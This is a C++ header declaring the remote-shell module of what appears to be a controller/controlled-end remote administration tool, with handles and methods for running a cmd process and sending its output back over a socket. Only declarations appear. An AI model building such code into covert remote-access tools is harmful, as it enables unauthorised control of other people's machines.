#pragma once

#include "SocketClient.h"

class CSocketClient;


// CMD命令的最大长度
#define SHELL_MAX_LENGTH 2048

#define SEND_BUFFER_MAX_LENGTH 8096

class CModuleShellRemote : public CModule {
public:
	HANDLE					m_hSendPacketShellRemoteConnectEvent;		// 被控端向主控端发回了SHELL_CONNECT响应包
	HANDLE					m_hRecvPacketShellRemoteCloseEvent;
	CRITICAL_SECTION		m_ExecuteCs;
	HANDLE					m_hRead;
	HANDLE					m_hWrite;

	HANDLE					m_hJob;

public:
	CModuleShellRemote(CSocketClient* pSocketClient);
	~CModuleShellRemote();

	// 重写虚函数
	void OnRecvivePacket(CPacket* pPacket);

	VOID RunCmdProcess();
	VOID LoopReadAndSendCommandReuslt();
	static DWORD WINAPI RunCmdProcessThreadFunc(LPVOID lParam);
	static VOID WINAPI OnRecvPacketShellRemoteExecute(LPVOID lParam);
};


typedef struct _SHELL_REMOTE_EXECUTE_THREAD_PARAM {
	CModuleShellRemote* m_pThis;
	CPacket* m_pPacket;
	_SHELL_REMOTE_EXECUTE_THREAD_PARAM(CModuleShellRemote* pThis, CPacket* pPacket) {
		m_pThis = pThis;
		m_pPacket = pPacket;
	}
}SHELL_REMOTE_EXECUTE_THREAD_PARAM;